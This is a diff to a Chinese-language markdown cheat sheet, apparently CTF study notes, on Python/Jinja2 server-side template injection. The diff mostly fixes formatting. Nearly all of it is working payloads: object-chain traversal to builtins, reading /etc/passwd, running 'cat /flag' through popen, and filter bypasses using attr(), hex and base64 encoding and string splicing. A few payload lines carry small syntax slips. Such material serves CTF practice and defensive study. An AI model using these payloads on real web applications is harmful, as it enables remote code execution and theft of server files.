@@ -22,52 +22,52 @@ ssti 服务端模板注入成因为：web 应用在使用框架（如 python 的
 
 - ## 获取基本类
 
-```markdown
-**dict** //返回类中的函数和属性，父类子类互不影响
-**base** //返回类的父类 python3
-**mro** //返回类继承的元组，(寻找父类) python3
-**init** //返回类的初始化方法  
-**subclasses**() //返回类中仍然可用的引用 python3
-**globals** //对包含函数全局变量的字典的引用 python3
+```
+dict //返回类中的函数和属性，父类子类互不影响
+base //返回类的父类 python3
+mro //返回类继承的元组，(寻找父类) python3
+init //返回类的初始化方法  
+subclasses() //返回类中仍然可用的引用 python3
+globals //对包含函数全局变量的字典的引用 python3
 
 对于返回的是类实例的话:
-**class** //返回实例的对象，可以使类实例指向 Class，使用上面的魔术方法
+class //返回实例的对象，可以使类实例指向 Class，使用上面的魔术方法
 ```
 
-```markdown
-''.**class**.**mro**[-1]
-{}.**class**.**bases**[0]
-().**class**.**bases**[0]
-[].**class**.**bases**[0]
+```
+''.__class__.__mro__[-1]
+{}.__class__.__bases__[0]
+().__class__.__bases__[0]
+[].__class__.__bases__[0]
 ```
 
 - ## 获取基本类后，继续获取基本类的子类
 
-  ```markdown
-  object.**subclasses**()
+  ```
+  object.subclasses()
   ```
 
 - ## 找\_\_init\_\_类
 
-  ```markdown
-  ''.**class**.**mro**[2].**subclasses**()[99].**init**
+  ```
+  ''.__class__.__mro__[2].__subclasses__()[99].__init__
   ```
 
 - ## 查看其引用\_\_builtins\_\_
 
-  ```markdown
-  ''.**class**.**mro**[2].**subclasses**()[138].**init**.**globals**['__builtins__']
+  ```
+  ''.__class__.__mro__[2].__subclasses__()[138].__init__.__globals__['__builtins__']
   ```
 
 - ## 寻找 keys 中可用函数，使用 keys 中的 file 等函数来实现读取文件的功能
 
-```markdown
-''.**class**.**mro**[2].**subclasses**()[138].**init**.**globals**['**builtins**']['file']('/etc/passwd').read()
+```
+''.__class__.__mro[2].subclasses()[138].init.globals['builtins']['file']('/etc/passwd').read()
 ```
 
 # 常用目标函数
 
-```markdown
+```
 file、subprocess.Popen、os.popen、exec、eval
 ```
 
@@ -77,7 +77,7 @@ file、subprocess.Popen、os.popen、exec、eval
 
   魔术方法\_\_getitem\_\_可替代中括号
 
-  ```markdown
+  ```
   当中括号被过滤时，如下将被限制访问:
   {{''.__class__.__base__.__subclasses__()['xx'].['popen']('cat /flag')}}
 
@@ -87,13 +87,13 @@ file、subprocess.Popen、os.popen、exec、eval
 
 - ## 过滤下划线
 
-  ```markdown
+  ```
   原 payload 被限制:
   {{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__['popen']('cat /flag').read() }}
 
   1.使用 attr()绕过，payload:
   {{ () | attr(request.args.a) | attr(request.args.b) | attr(request.args.c) | attr(request.args.d) | attr(request.args.e)()['popen']('cat /flag') | attr('read')() }}
-  同时 get 方法传参?a=**class**&b=**base**&c=**subclasses**&d=**init**&e=**globals**
+  同时 get 方法传参?a=__class__&b=__base__&c=__subclasses__&d=__init__&e=__globals__
 
   2.将下划线进行编码绕过，payload:
   {{ ().['\x5f\x5fclass\x5f\x5f']['\x5f\x5fbase\x5f\x5f']['\x5f\x5fsubclasses\x5f\x5f']()[xx]['\x5f\x5finit\x5f\x5f'].['\x5f\x5fglobals\x5f\x5f']['popen']('cat /flag') }}
@@ -101,7 +101,7 @@ file、subprocess.Popen、os.popen、exec、eval
 
 - ## 过滤点
 
-  ```markdown
+  ```
   原 payload 被限制:
   {{ ().__class__.__base__.subclasses__()[xx].__init__.__globals__['popen']('cat /flag').read() }}
 
@@ -114,15 +114,15 @@ file、subprocess.Popen、os.popen、exec、eval
 
 - ## 过滤大括号
 
-使用`{%%}`替代`{{}}`，payload:
+使用\{%%\}替代\{{}}，payload:
 
-```text
+```
 {% print(''.__class__.__base__.__subclasses__()[xx].__init__.__globals__['popen']('cat /flag').read()) %}
 ```
 
 - ## 过滤引号
 
-  ```markdown
+  ```
   当'被过滤后以下访问将被限制
   {{ ().__class__.__base__.subclasses__()[xx].__init__.__globals__['popen']('cat /flag').read() }}
 
@@ -141,21 +141,21 @@ file、subprocess.Popen、os.popen、exec、eval
 
 - ## 过滤数字
 
-  ```markdown
+  ```
   使用过滤器 length 绕过
   {% set a='aaa' | lenth %}{{ ().__class__.__base__.__subclasses__()[a]}}
   ```
 
 - ## 过滤函数名
 
-  ```markdown
+  ```
   1.使用拼接绕过，payload:
   {{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__['pop'+'en']('cat /fl' + 'ag').read() }}
-
-  2.16 进制编码绕过，payload:
+  
+  2.16进制编码绕过，payload:
   {{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__['\x70\x6f\x70\x65\x6e']('cat /flag').read() }}
-
-  3.base64 编码绕过，payload:
+  
+  3.base64编码绕过，payload:
   {{ ().__class__.__base__.__subclasses__()[xx].__init__.__globals__[base64.b64decode('cG9wZW4=').decode()]('cat /fl' + 'ag').read() }}
   ```
 
